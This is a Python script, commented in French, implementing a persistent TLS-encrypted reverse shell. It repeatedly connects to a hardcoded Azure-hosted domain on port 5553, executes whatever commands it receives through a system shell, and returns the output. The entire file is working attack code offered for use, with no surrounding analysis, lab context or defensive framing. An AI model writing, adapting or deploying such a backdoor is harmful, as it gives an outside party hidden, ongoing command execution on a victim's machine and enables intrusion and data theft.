#!/usr/bin/python3
import socket
import ssl
import os
import select
import subprocess
import time

SERVER_IP = "server803632.westeurope.cloudapp.azure.com"  # Remplacez par le domaine ou IP du serveur
SERVER_PORT = 5553                # Port configuré pour le reverse shell sécurisé
current_directory = "/"

def connect_to_server():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
            # Pour tests avec certificat auto-signé, décommentez:
            # context.check_hostname = False
            # context.verify_mode = ssl.CERT_NONE
            ssl_sock = context.wrap_socket(sock, server_hostname=SERVER_IP)
            ssl_sock.connect((SERVER_IP, SERVER_PORT))
            print("[+] Connecté au serveur via SSL")
            spawn_shell(ssl_sock)
        except Exception as e:
            print(f"[!] Erreur de connexion : {e}")
            time.sleep(5)

def spawn_shell(ssl_sock):
    global current_directory
    while True:
        try:
            r, _, _ = select.select([ssl_sock], [], [])
            if ssl_sock in r:
                cmd = ssl_sock.recv(1024).decode('utf-8', errors='ignore').strip()
                if not cmd:
                    break
                if cmd.startswith("cd "):
                    new_dir = cmd[3:].strip()
                    try:
                        os.chdir(new_dir)
                        current_directory = os.getcwd()
                        ssl_sock.sendall(f"Changed directory to {current_directory}\n".encode())
                    except Exception as e:
                        ssl_sock.sendall(f"cd: {e}\n".encode())
                    continue
                output = run_shell_command(cmd, current_directory)
                ssl_sock.sendall(output)
        except Exception as e:
            print(f"[!] Erreur dans le shell : {e}")
            break

def run_shell_command(cmd, cwd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, cwd=cwd)
        return (result.stdout + result.stderr).encode('utf-8', errors='ignore')
    except Exception as e:
        return f"Erreur: {str(e)}\n".encode('utf-8')

if __name__ == "__main__":
    connect_to_server()
